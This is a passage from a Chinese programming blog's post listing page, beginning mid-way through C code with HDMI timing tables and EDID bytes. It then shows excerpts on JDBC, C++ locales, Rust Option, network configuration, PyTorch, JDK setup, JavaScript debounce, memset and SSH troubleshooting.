1080, 64, 27, 198000, 0, false, 998, 44, 148, true, 4, 5, 11, true }, { 3840, 2160, 16, 9, 594000, 0, false, 1276, 88, 296, true, 8, 10, 72, true }, { 4096, 2160, 256, 135, 594000, 0, false, 1020, 88, 296, true, 8, 10, 72, true }, { 3840, 2160, 64, 27, 594000, 0, false, 1276, 88, 296, true, 8, 10, 72, true }, { 3840, 2160, 16, 9, 1188000, 0, false, 1056, 88, 296, true, 8, 10, 72, true }, { 3840, 2160, 16, 9, 1188000, 0, false, 176, 88, 296, true, 8, 10, 72, true }, { 3840, 2160, 64, 27, 1188000, 0, false, 1056, 88, 296, true, 8, 10, 72, true }, { 3840, 2160, 64, 27, 1188000, 0, false, 176, 88, 296, true, 8, 10, 72, true }, /* VIC 121 */ { 5120, 2160, 64, 27, 396000, 0, false, 1996, 88, 296, true, 8, 10, 22, true }, { 5120, 2160, 64, 27, 396000, 0, false, 1696, 88, 296, true, 8, 10, 22, true }, { 5120, 2160, 64, 27, 396000, 0, false, 664, 88, 128, true, 8, 10, 22, true }, { 5120, 2160, 64, 27, 742500, 0, false, 746, 88, 296, true, 8, 10, 297, true }, { 5120, 2160, 64, 27, 742500, 0, false, 1096, 88, 296, true, 8, 10, 72, true }, { 5120, 2160, 64, 27, 742500, 0, false, 164, 88, 128, true, 8, 10, 72, true }, { 5120, 2160, 64, 27, 1485000, 0, false, 1096, 88, 296, true, 8, 10, 72, true }, }; static int edid[] = { 0x00,0xff,0xff,0xff,0xff,0xff,0xff,0x00,0x50,0x6c,0x62,0x09,0x01,0x00,0x00,0x00, 0x11,0x1c,0x01,0x03,0x80,0x73,0x41,0x78,0x0a,0xcf,0x74,0xa3,0x57,0x4c,0xb0,0x23, 0x09,0x48,0x4c,0x21,0x08,0x00,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01,0x01, 0x01,0x01,0x01,0x01,0x01,0x01,0x02,0x3a,0x80,0x18,0x71,0x38,0x2d,0x40,0x58,0x2c, 0x45,0x00,0x20,0xc2,0x31,0x00,0x00,0x1e,0x01,0x1d,0x00,0x72,0x51,0xd0,0x1e,0x20, 0x6e,0x28,0x55,0x00,0x20,0xc2,0x31,0x00,0x00,0x1e,0x00,0x00,0x00,0xfc,0x00,0x54, 0x43,0x4c,0x20,0x53,0x4d,0x41,0x52,0x54,0x20,0x54,0x56,0x0a,0x00,0x00,0x00,0xfd, 0x00,0x3b,0x46,0x1f,0x8c,0x3c,0x00,0x0a,0x20,0x20,0x20,0x20,0x20,0x20,0x01,0x4c, 0x02,0x03,0x35,0xf0,0x53,0x10,0x1f,0x14,0x05,0x13,0x04,0x20,0x22,0x3c,0x3e,0x12, 0x16,0x03,0x07,0x11,0x15,0x02,0x06,0x01,0x26,0x09,0x07,0x03,0x15,0x07,0x50,0x83, 0x01,0x00,0x00,0x6e,0x03,0x0c,0x00,0x20,0x00,0xb8,0x3c,0x20,0x00,0x80,0x01,0x02, 0x03,0x04,0xe2,0x00,0xfb,0x02,0x3a,0x80,0xd0,0x72,0x38,0x2d,0x40,0x10,0x2c,0x45, 0x80,0x30,0xeb,0x52,0x00,0x00,0x1f,0x01,0x1d,0x00,0xbc,0x52,0xd0,0x1e,0x20,0xb8, 0x28,0x55,0x40,0x30,0xeb,0x52,0x00,0x00,0x1f,0x8c,0x0a,0xd0,0x8a,0x20,0xe0,0x2d, 0x10,0x10,0x3e,0x96,0x00,0x13,0x8e,0x21,0x00,0x00,0x18,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70 }; void block_name(unsigned char block) { switch (block) { case 0x00: printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c42d9eee745789466bea5217f7d6abf8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9307b63c7d1b2effd6f7e1350a7543d7/" rel="bookmark">
			JDBC的封装及使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JDBC的封装及使用 JDBC七大操作步骤的关于API的介绍 java.sql.Drvier 驱动接口 java.sql.DriverManager:驱动管理类(管理jdbc的驱动服务) java.sql.Connection:与特定数据库的一种会话连接 java.sql.Statement:执行静态sql语句 (执行对象,操作数据库) java.sql.ResultSet:获取数据表的结果集 (接口) JDBC操作步骤中API说明 Jdbc的操作步骤: 1)导包并且注册驱动 Class.forName("com.mysql.jdbc.Driver) ; //mysql5.5对应5.1jar包 这样写的目的是为了保证向后的兼容性:目的就是加载这个类! 本身注册驱动使用的是DriverManager:管理jdbc的驱动服务 方法:public static void registerDriver(Driver driver) throws SQLException 方法的形式参数是接口,需要接口的子实现类对象 接口:java.sql.Drvier 但是不需要使用这种写法,因为驱动jar包已经完成一件事情,注册驱动 public class Driver implements java.sql.Driver //类一加载的时候,就会执行静态代码块,注册驱动 static { try { java.sql.DriverManager.registerDriver(new Driver()); } catch (SQLException E) { throw new RuntimeException("Can't register driver!"); } } 2)获取数据库的连接对象 Connection conn = DriverManager.getConnection( "jdbc:mysql://localhost:3306/myee_2203_02", "root", "123456" ); 涉及一个类java.sql.DrivarManager:驱动管理类 //获取数据库的连接对象,返回值是java.sql.Connection public static Connection getConnection(String url, String user, String password) throws SQLException 参数1:url 统一自定义定位符 url: jdbc:mysql://域名:端口号/库名 参数2:user: 登录mysql的用户,默认都是管理员用户 参数3:password:登录mysql的密码 java.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9307b63c7d1b2effd6f7e1350a7543d7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e50dedc3561d7667a3f9c31673db32b1/" rel="bookmark">
			【字符集五】c&#43;&#43;标准库＜locale＞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		c++标准库locale 一、locale二、设置locale (std::locale::locale)三、获取locale的名字 (std::locale::name)四、设置全局locale(std::locale::global)五、out.getloc、out.imbue六、facet 上篇主要讲解了c语言的标准库&lt;locale.h&gt;,本篇文章主要讲解下c++的标准库locale。 真正的国际化来说，仅仅翻译“文字所带的信息”通常是不够的。各种不同的数值、货币、日期…的规格也都必须准守。另外，用来操作字母（latters）的函数，应该根据字符（characters）进行编码（encoding），以确保正确处理特定语言中所有身为字母的字符。根据POSIX和X/Open标准，c程序可使用函数setlocale来设定一个locale。改变locale会对issupper()和toupper()之类的字符分类、操作函数以及printf()之类的I/O函数产生影响。然而C的解决方案毕竟有诸多限制。由于locale是全局属性，所以同时使用一个以上的locale（例如，按英文规则读取浮点数，按照德文写出），即使不是不可能，也得费九牛二虎之力才有希望。此外locales不能扩展，如果某个必须遵守的国家协议未被c locale支持，就没有办法了。最后一点，我们根本不可能为了支持特殊文化而定义新的locales.c++标准程序库利用面向对象方式解决了上述所述问题。首先，“与locale相关的细节”被封装在类型为locale的对象中。仅仅如此这般，在同一时刻运用多个locales的美梦成真。与locales相依的各种操作，将运用响应的locale对象。 例如，我们可以把每一个locale对象安装到每一个I/O stream中，或者的各成员函数便利用该对象迎合相应的规格。详见本文的（五、out.getloc、out.imbue）参考《c++标准程序库》第14章：国际化 一、locale 参见：locale,本文章主要讲解和locale相关的知识，针对facet在本文的《六、facet》只做简单介绍。
A locale is a set of features that are culture-specific, which can be used by programs to be more portable internationally.
In C++, locales are represented by an object of the locale class. Each of these locale objects contains all the information needed to use a set of culture-dependent features.
简单翻译：locales是c++中locale对象的实例。
二、设置locale (std::locale::locale) c++ 11 构造函数，参见std::locale::locale
构造函数，参考书籍《c++标准程序库》第14章：国际化中有中文介绍。
表达式功能locale()产生一个当前全局locale的副本locale(name)根据名称产生一个localelocale(loc)产生locale loc的副本locale(loc1,loc2,cat)产生locale loc1的一个副本，类别cat中所有的facets将被locale loc2的facets替换locale(loc,name,cat)此动作等同于locale(loc1,loc2,cat)locale(loc,fp)产生一个locale loc的一个副本，并安装fp所指的facet将loc2赋值给loc1loc1=loc2将loc2赋值给 loc1loc1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e50dedc3561d7667a3f9c31673db32b1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2e70e4bee1e3d33d4e936821e1dde4c9/" rel="bookmark">
			Web端和App端测试的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Web端和App端测试的区别 Web端和App端测试的区别包括以下： Web项目是B/S架构，基于浏览器的。App项目是C/S架构，必须要有客户端，用户需要安装客户端。
对于更新版本，Web项目只需要更新服务端，客户端就会同步更新，而App项目需要客户端和服务端都同时更新。
①从测试流程上看，基本没有区别。都是需要经历测试计划方案、用例设计、用例执行、缺陷管理、测试报告编写等相关活动。 ②从测试类型上，基本相似。都需要功能测试、性能测试、安全性测试、GUI测试等。 web测试是基于浏览器的，所以不用考虑安装卸载。
而App是客户端，必须测试安装、卸载、更新，还需要考虑其他异常情况，包括安装时候中断、弱网，安装后删除安装文件（可删除，不影响软件正常运行）。 App还有专项测试，如网络适配性、运营商环境、WIFI。
还有中断测试，就是在操作软件的时候，来电话、短信、电量不足提示等外部事件发生，会不会影响软件正常运行。
③从具体测试的细节和方法上有区别：
（1）性能测试：web页面测试主要关注的是响应时间；而App测试还需要关注流量、耗电量、CPU、内存等。
（2）兼容性方面：web是基于浏览器的，所以倾向于浏览器、电脑硬件、操作系统方面的兼容；而App测试兼容的是手机设备，要看设备系统、机型、分辨率、屏幕尺寸。
（3）交互方式：web主要采用鼠标点击方式；而App主要是手指点击、拖拽、手势测试、横屏测试，考虑更多的是手指的交互习惯。重点考虑回退、刷新是否会造成二次提交。
（4）升级测试：升级测试的是提醒机制，升级取消是否会影响原有的功能的使用；升级后用户数据是否会被清除等。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7003bf761f433c475c25582165b45ea3/" rel="bookmark">
			Rust - Option 常用方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		学习Rust不仅需要知道标准库的常用triat 以外,还需要知道 常用类型的常用方法
Option 枚举应该是最常用的类型了
推荐文章 Rust 标准库中的 Trait 之旅
开始 简述: Option 就是一个枚举,用来代表null的概念
pub enum Option&lt;T&gt; { None,//没有价值,也就是null Some(T),//存有T类型值 } 常用方法 T 代表 Some(T) 中的T类型
v 代表 Some(v) 中的 v 值
impl&lt;T&gt; Option&lt;T&gt; pub const fn is_some (&amp;self) -&gt; bool // 若是 Some 则返回 true pub const fn is_none (&amp;self) -&gt; bool // 若是 None 则返回 true pub fn is_some_and (&amp;self, f: impl FnOnce ( &amp; T) -&gt; bool ) -&gt; bool // 若是 Some 且 f函数返回true,则返回true pub fn unwrap(self) -&gt; T // 若是 Some(v) ,则返回 v // 若是 None 则直接 panic!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7003bf761f433c475c25582165b45ea3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d90063409012f2d49535c69bf6881442/" rel="bookmark">
			keil的debug使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在点这个之前要先烧写一次程序，不然这一次修改后的程序没有烧进单片机里
然后在debug模式下点运行，然后再点停止
如果代码有问题就会停在有问题的地方不断循环
多试几次如果都停在同一个地方就是那里的代码有问题
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9db11a6a21c9e3a2877f52b2308c6ae/" rel="bookmark">
			DHCP与DNS与NAT配置--华为设备--ENSP模拟器--内外访问外网
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		实验拓扑
获取地址
项目连接
实验步骤
SW1
配置的接口
配置的DHCP
配置缺省路由
# interface GigabitEthernet0/0/1 port link-type access port default vlan 10 # interface GigabitEthernet0/0/2 port link-type trunk port trunk allow-pass vlan 2 to 4094 # DHCP配置在交换机SW2上 1.dhcp enable 2.ip pool 1 network 192.168.1.0 mask 255.255.255.0 dns-list 192.168.4.1 gateway-list 192.168.1.254 #excluded-ip-address #可选 #excluded-ip-address 10.1.1.4 #lease day 10 3.vlan batch 10 20 4.int vlanif 10 ip address 192.168.1.254 255.255.255.0 dhcp select global 5.display ip pool AR1
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9db11a6a21c9e3a2877f52b2308c6ae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3981393209757cf989e1767ac88b0dc6/" rel="bookmark">
			神经网络的搭建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		模块Module
为所有神经网络提供基本类
继承nn.Module类
1.初始化函数
2.前向传播函数(x先进性一个卷积1，在进行relu激活函数非线性处理。再进行一个卷积一个非线性处理）
搭建神经网络 #神经网络的搭建 import torch from torch import nn class Tudui(nn.Module): #创建类(继承) def __init__(self): #重写两个方法 super(Tudui,self).__init__() # self.conv1 = nn.Conv2d(1,20,5) # self.conv2 = nn.Conv2d(20,20,5) # def forward(self,x): # x = F.relu(self.conv1(x)) # return F.relu(self.conv2(x)) def forward(self,input): #举例简单的forward函数 output = input + 1 return output tudui =Tudui() x = torch,tensor(1.0) output = tudui(x) print(output) #卷积层convolution layers #nn.conv2d 二维的(图片) import torch import torch.nn.functional as F input = torch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3981393209757cf989e1767ac88b0dc6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a832b43fabebb138de8af3d39f43612f/" rel="bookmark">
			JDK环境配置和eclipse安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、JDK环境配置具体配置过程 二、eclipse的安装三、创建第一个项目 一、JDK环境配置 进入Oracle官网，选择相应的JDK类型进行下载。
在这里直接给大家提供网盘下载链接：
https://pan.baidu.com/s/1FN4kLVp439OA_7rTa67nYA
提取码:6ab2
点击下载好的JDK即可进行安装，按照指导，直接点击下一步，就可完成安装。
安装完成后的界面是这样的：
具体配置过程 1.打开【我的电脑】-【属性】，选择【高级系统设置】
2.在弹出的【系统属性】界面中，选择【高级】标签页，点击【环境变量】
3.在弹出的环境变量窗口中，，点击系统变量下的【新建】按钮，在弹出的【新建系统变量】按钮中，新建一个名为"JAVA_HOME"的环境变量，如下图：
其中的变量值为JAVA的安装路径.
4.设置path环境变量，如果是第一次配置就新建一个名为Path的环境变量。在变量值中输入以下信息：
%JAVA_HOME%\bin;JAVA_HOME%\jre\bin 如果是之前就配置过的，就点击下方的“编辑”按钮，在弹出的窗口最底端中添加如下信息：
%JAVA_HOME%\bin;JAVA_HOME%\jre\bin 然后点击确定即可。
5.在系统变量中，新建一个名为CLASSPATH的环境变量，设置变量值为：
.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar 点击确定。
6.JDK安装成功后需要确认环境是否配置正确，我们可以进行以下操作：
按【win】+【R】，在弹出的搜索框中输入cmd，点击确认后，启动控制台。
在控制台中分别输入java,javac,java -version命令。
输入java命令时：
输入javac命令时：
输入java _version命令时：
当显示以上界面时说明JAVA已安装成功，接下来我们进行eclipse的安装。
二、eclipse的安装 网盘下载链接：
https://pan.baidu.com/s/1x4ygIjaXMMEvUGgfSSnXug
提取码:m8g5
将压缩包下载好之后，解压到相应位置之后，双击图中的文件夹运行即可。
双击之后会弹出一个对话框让我们选择路径，这是路径是之后我们用来存放代码的，所以按照自己的需求进行修改即可。
接着，我们就进入welcome界面了，到这里eclipse的安装也就完成了。
三、创建第一个项目 点击【File】-【New】-【Project】,在弹出的对话框中按照图中所示进行操作：
接下来，在【Package Explorer】中可以看到我们创建的First项目，
在项目下的【src】上点击右键，选择【New】-【class】，弹出如下界面：
输入类的名字后，点击【Finish】即可。
注意：Package也需要输入名称，例：HelloWorld, 否则在之后运行程序时会报错。
接着，我们就可以编写程序啦！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e72c807f55fa82abe7b4bcf7c522619f/" rel="bookmark">
			Java openjudge javastudy 7
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		57:谁考了第k名 描述
在一次考试中，每个学生的成绩都不相同，现知道了每个学生的学号和成绩，求考第k名学生的学号和成绩。
输入
第一行有两个整数，分别是学生的人数n（1≤n≤100），和求第k名学生的k（1≤k≤n）。
其后有n行数据，每行包括一个学号（整数）和一个成绩（浮点数），中间用一个空格分隔。
输出
输出第k名学生的学号和成绩，中间用空格分隔。（注：请用%g输出成绩）
样例输入
5 3 90788001 67.8 90788002 90.3 90788003 61 90788004 68.4 90788005 73.9 样例输出
90788004 68.4 import java.util.Scanner; public class Main { public static void main(String[] args) { int n, k, s; int sno[] = new int[101]; double grade[] = new double[101]; double g; Scanner in = new Scanner(System.in); n = in.nextInt(); k = in.nextInt(); for (int i = 0; i &lt; n; i++) { sno[i] = in.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e72c807f55fa82abe7b4bcf7c522619f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb6cd0afb591e03605d5e9bc5050855a/" rel="bookmark">
			目标检测后处理中检测框不稳定的处理方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 经历了场景需求调研，方案技术路线。下面开始时间算法开发：
开始数据采集，数据集的制作，模型训练，模型的评价及模型的选择，算法逻辑的设置。在算法的逻辑设计过程中可能也会对数据进行扩充，模型的再训练。但是我们通过目标检测算法获得的目标检测框因为种种原因会造成目标框的不稳定，例如：目标框跳动、有时候会检测到有时候检测不到。
一、目标检测框不稳定类型 1.目标检测框的宽高比不稳定
2.目标检测框的中心坐标稳定
3.目标检测框连续若干帧检测不到
二、目标检测框不稳定的原因 图像采集设备的噪声光照天气等因素的影响解码噪声的影响数据不均衡的影响
（1）类别不平衡：前景和背景不平衡、前景中不同类别输入包围框的个数不平衡；
（2）尺度不平衡：输入图像和包围框的尺度不平衡，不同特征层对最终结果贡献不平衡；
（3） 空间不平衡：不同样本对回归损失的贡献不平衡、正样本IoU分布不平衡、目标在图像中的位置不平衡；
（4）目标函数不平衡：不同任务（比如回归和分类）对全局损失的贡献不平衡 三、优化方法 3.1 数据标注方面 在数据采集的过程中，我们去采集不同环境下的数据，例如：阴天、下雨、下雪、夜晚、强光照环境。数据标注方面尽量按照严格的标准去标注数据。
3.1 模型方面 在训练过程中对数据进行增强，增加其他的小trics。使用模型的评价指标、挑选合适的模型。
3.3 后处理方面 在获取检测的目标框信息后，可以使用一些滤波、跟踪的算法去平滑检测的边界框。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35099126252fa081187d7aa1581b11af/" rel="bookmark">
			防抖和节流
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		防抖和节流的使用场景
防抖（debounce）
1.search搜索联想，用户在不断输入值时，用防抖来节约请求资源。
2.window触发resize的时候，不断的调整浏览器窗口大小会不断的触发这个事件，用防抖来让其只触发一次
节流（throttle）
1.用户在输入框不断输入值时，每隔规定的时间来读取一次数据 input(单位时间内只触发一次)
2.轮播图在播放过程中,用户不断点击切换没有效果,只能在规定时间后才可以进行点击
防抖： 高频率触发的事件,在指定的单位时间内，只响应最后一次(后面触发的事件执行，替代了前面的事件)
&lt;input type="text" id="inp" value=""&gt; &lt;script&gt; function debounce(fn, time) { let timeout = null; // 创建一个标记用来存放定时器的返回值 return function () { clearTimeout(timeout); // 每当用户输入的时候把前一个 setTimeout 删除 timeout = setTimeout(() =&gt; { // 然后又创建一个新的 setTimeout, 保证输入字符后的间隔内如果还有字符输入的话，就不会执行 fn 函数 fn.apply(this); }, time); }; } function fn() { // 在控制台打印输入框中输的信息,也就是value console.log(this.value); } var inp = document.getElementById('inp'); inp.addEventListener('input', debounce(fn, 5000)); // 防抖 &lt;/script&gt; 节流： 高频率触发的事件,在指定的单位时间内，只响应第一次(前面触发的执行前，忽略后面的事件)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4f6ae012562e72e06aec439317b68d00/" rel="bookmark">
			软考——软件工程——结构化分析与设计方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1，结构化分析SA方法
1.1，数据流图DFD
1.2，数据字典DD
1.3，加工逻辑的描述
2，结构化设计SD方法
3，结构化程序设计SP方法
结构化分析与设计方法是一种面向数据流的传统软件开发方法，它以数据流为中心构建软件的分析模型和设计模型。结构化分析SA、结构化设计SD、结构化程序设计SP构成了完整的结构化方法。
结构化分析SA方法：
是将系统开发看成工程项目，有计划、有步骤地进行工作，是一种应用很广泛的开发方法，采用“自顶向下，逐层分解”的开发策略。
分为以下几部分：
1，一套分层的数据流图DFD：用来描述数据流从输入到输出的变换流程。
2，一本数据字典DD：用来描述DFD中的每个数据流、文件以及组成数据流或文件的数据项。
3，一组小说明（也称加工逻辑）：用来描述每个基本加工（即不在分解的加工）的加工逻辑。
数据流图DFD：
描述系统的输入数据流如何经过一系列的加工，逐步变换成系统的输出数据流。
DFD的信息流大体上可以分为两种类型：一种是变换流（对应的映射是变换分析），一种是事务流（对应的映射是事务分析）。
数据流：由一组固定成分的数据组成，表示数据的流向。
加工：描述输入数据流到输出数据流之间的变换，即过程。
数据存储：用来表示存储数据，每个数据存储都有一个名字。
外部实体：是指存在于软件系统外的人员、组织或其它系统。它指出 系统所需数据的发源地和系统所产生的数据的归宿地。
数据字典DD：
就是用来定义表示数据流图中各个成分的具体含义的，它以一种准确的、无二义性的说明方法为系统的分析、设计及维护提供了有关元素一致的定义和详细的描述。
数据字典中有4类条目：数据流、数据项、数据存储、基本加工。
符号含义说明=被定义为+与x=a+b,表示x由a和b组成[...|...]或x=[a|b],表示x由a或b组成{...}重复x={a},表示x是由0个或多个a组成m{...}n{...}或{...}重复x=2{a}5，表示x中最少出现2次a，最多出现5次a，5和2为重复次数的上下限（...）可选x=(a),表示a可在x中出现，也可以不出现"..."基本数据元素x="a"，表示x是取值为字符a的数据元素..连接符x=1..9，表示x可取1~9中任意一个值 数据流条目给出了DFD中数据流的定义，通常列出该数据流的各组成数据项。
数据存储条目是对数据存储的定义。
数据项条目是不可再分解的数据单位。
加工条目是用来说明DFD中基本加工的处理逻辑。
加工逻辑的描述：
1，结构化语言：是介于自然语言和形式语言之间的一种半形式语言，它的结构可分为外层和内层两层。
外层：用来描述控制结构，采用顺序、选择和重复3种基本结构。
内层：一般是使用祈使句形式的自然语言短语。
2，判定表：能够清楚地表达复杂的条件组合与应做的动作之间的对应关系。
3，判定树：也称为决策树，适合描述问题处理中具有多个判断，而且每个决策与若干条件有关。
结构化设计SD方法：
是将结构化设计分析得到的数据流图映射出软件体系结构的一种设计方法。强调模块化、自顶向下逐步求精、信息隐蔽、高内聚、低耦合等设计规则。软件设计分为概要设计和详细设计两个步骤。
结构图：
1，模块：指具有一定功能并可以用模块名调用的一组程序语句，一个模块具有外部特征和内部特征；
2，调用：模块和模块之间的调用关系用从一个模块指向另一个模块的箭头来表示；
3，数据：模块间还经常用带注释的短箭头表示模块调用过程中来回传递的消息。箭头尾部带空心圆的表示传递的是数据，带实心圆的表示传递的是控制信息。
4，结构图的形态特征：
深度：指控制图控制的层次，也就是模块的层数；
宽度：指一层中最大的模块个数；
扇出：指一个模块的直接下属模块的个数；
扇入：指一个模块的直接上属模块的个数。
结构化程序设计SP方法：
1，采用自顶向下、逐步求精的程序设计方法。
2，使用3种基本控制结构构造程序。任何程序都可以由顺序、选择、重复3种基本控制结构构造，这3种基本结构的共同点是单入口、单出口。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/36cee8ff60682bee5fb80145c60b8680/" rel="bookmark">
			memset及sizeof的用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、sizeof(数组名)与sizeof(*数组名)
举例
#include&lt;stdio.h&gt;
int main()
{
int p[5]={1,2,3,4};
printf("sizeof（数组名）= %d\n",sizeof(p)); printf("sizeof *（数组名）= %d\n",sizeof(*p));
}
运行结果
sizeof（数组名）= 16
sizeof *（数组名）= 4
分析：
a代表数组的首地址，所以sizeof(a)代表整个数组所占的内存空间，int占用4Byte，即4*4Byte=16Byte;
*a表示指向首地址的指针，表示首地址的内容，所以sizeof(*a)表示a[0]所占内存空间的大小;
void *memset(void *s, int ch, size_t n);
memset当数组作为参数传递时，其传递的实际上是一个指针，这个指针指向数组的首地址，如果用sizeof(a)函数得到的只是指针的长度，而不是数组的长度。
二、memset是一个初始化函数，作用是将某一块内存中的全部设置为指定的值。
void *memset(void *s, int ch, size_t n);
函数解释：将s中当前位置后面的n个字节 （typedef unsigned int size_t ）用 ch 替换并返回 s；
memset函数是按照字节对内存块进行初始化，所以不能用它将int数组出初始化为0和-1之外的其他值（除非该值高字节和低字节相同）。
其实c的实际范围应该在0~255，因为memset函数只能取c的后八位给所输入范围的每个字节。也就是说无论c多大只有后八位二进制是有效的。
对于int a[4];
memset(a, -1, sizeof(a)) 与 memset(a, 511, sizeof(a)) 所赋值的结果一样都为-1：
因为 -1 的二进制码为（11111111 11111111 11111111 11111111）；511 的二进制码为（00000000 00000000 00000001 11111111）；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/36cee8ff60682bee5fb80145c60b8680/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/09ef3d1cd779ea7f744bb1f38c57f7ed/" rel="bookmark">
			ssh连接虚拟机错误(Connection failed: connection refused. No more addresses to try)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 ssh 连接虚拟机错误(Connection failed: connection refused. No more addresses to try) 原因 在本机使用ping 命令,出现(DUP!) 要链接的虚拟机被设置了静态IP,从而导致在局域网中出现了IP地址冲突导致的 解决方案 为要链接的虚拟机修改一个新的静态ip地址 #编辑网卡(编辑对应的网卡文件名称,这里我使用的是ens33网卡,可以使用 ifconfig命令查看当前所使用的网卡)配置文件 vim /etc/sysconfig/network-scripts/ifcfg-ens33 # ifcfg-ens33 文件中修改或增加以下配置 #修改ip类型为静态ip BOOTPROTO=static #静态ip(修改ip地址) IPADDR=192.168.1.104 #网段 NETMASK=255.255.255.0 #网关地址(可以从宿主机中获取) GATEWAY=192.168.1.1 #DNS地址(可以从宿主机中获取) DNS1=192.168.1.1 #重启network服务 systemctl network restart 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4bac07f12748e1f6658732a5fb1170df/" rel="bookmark">
			c语言中void的用法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		void
void最常见的用法，就是在函数中限定函数的参数和返回值的 void draw(void); 表明函数draw没有参数也没有返回值，void在别的的地方的应用我也没见过；
实际上，如果把void 和int，char，double等类型放到一起理解的话，首先还是那句揭示本质的话：变量类型就是固定大小内存块的别名，那么void占用多大内存呢，编译器并没有定义void占用多大内存，所以对于void var; 这样的定义，编译器自然是不允许的，在vs中的错误提示是：不允许使用不完整的类型。
void*
相比于void,void *就更加有意义一些。void *是一个指针类型，指针变量都占4byte内存（4byte=32 bit=2^32=4G,所以4byte就足以指向任何的内存地址了），所以对于void *p=NULL; 这样的定义，编译器可以为p分配内存，那么，如此定义的p有什么作用呢？
int *a=NULL; p=a; double *b=NULL; p=b; char c[16]={0}; p=c; void* 就像一张白纸，任何类型的指针都可以直接赋值给void *类型的指针；
但是反过来
int *a=NULL; a=p;//err a=(int *)p;//需要强制类型转换 典型应用
一、
void * memcpy(void *dest, const void *src, size_t len); void * memset ( void * buffer, int c, size_t num ); memcpy和memset对外接收任何类型的指针，这样是合理并且必要的，因为这是内存操作函数，是对bit进行操作的，考虑数据类型是没有任何意义的（越触及本质，越抽象，也越有包容性）。
二、
int *a=NULL； a=（int *）malloc(sizeof(int)); 同样的，malloc函数只关注你要多大的内存，你需要把它怎么划分是你的事情，但是你需要显式的表明你是怎么划分的。这里语法要求是必须的，void *类型转为其他类型必须强制类型转换。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00b7bc1224516a3cc6693739480e63e1/" rel="bookmark">
			antd Anchor锚点踩坑 没动画 高亮
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.如果容器是window的话。滚动页面高亮锚点没跟着改变 检查body的高度 或者说容器高度 是不是100vh
2.点击锚点没有滚动条动画的话 加上 e.preventDefault() 阻止使用a标签跳转
&lt;Anchor className={styles.AnchorWrap} onClick={handleClick}&gt; // onClick={handleClick} 加上这个 {anchorText.map((item, index) =&gt; { return &lt;Link href={item.id} title={anchorRender(item.text, index)} /&gt;; })} &lt;/Anchor&gt; //handleClick代码 const handleClick = (e, link) =&gt; { e.preventDefault(); const element = document.querySelector(link.href); element &amp;&amp; element.scrollIntoView({ block: 'start', behavior: 'smooth' }); }; 被这个困惑了好久 不想再有好兄弟被搞 分享一下
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
